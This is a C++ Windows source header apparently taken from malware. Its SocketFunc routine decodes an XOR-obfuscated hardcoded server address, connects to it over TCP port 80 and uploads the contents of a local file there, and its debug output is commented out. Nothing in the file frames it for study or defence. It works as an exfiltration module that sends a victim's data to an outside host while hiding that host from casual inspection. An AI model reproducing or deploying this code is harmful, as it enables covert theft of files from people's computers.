#pragma once
#include <WinSock2.h> 
#include "header.h"
#pragma comment(lib,"ws2_32") 
#define PORT 80

void SocketFunc() {
	string SERVER_IP = "GJ]AGD]AD]BD"; // 49.247.27.17
	string key = "s";
	string decrypted = xorEncrypt(SERVER_IP, key);
	const char* IPString = decrypted.c_str();

	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	SOCKET hSocket;
	int client_fd;
	hSocket = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

	SOCKADDR_IN tAddr = {};
	tAddr.sin_family = AF_INET;
	tAddr.sin_port = htons(PORT);
	tAddr.sin_addr.s_addr = inet_addr(IPString);

	connect(hSocket, (SOCKADDR*)&tAddr, sizeof(tAddr));

	BufferRead();

	char buffer[256];
	size_t bytes_read;
	while ((bytes_read = fread(buffer, 1, sizeof(buffer), file_to_send)) > 0) {
		int iResult = send(hSocket, buffer, bytes_read, 0);
		if (iResult == SOCKET_ERROR) {
			//wprintf(L"send failed with error: %d\n", WSAGetLastError());
			closesocket(hSocket);
			WSACleanup();
			exit(EXIT_FAILURE);
		}
	}
	//printf("Client Send File : %s\n", buffer);
	//SendFileName(hSocket);
	fclose(file_to_send);
	closesocket(hSocket);
	WSACleanup();
}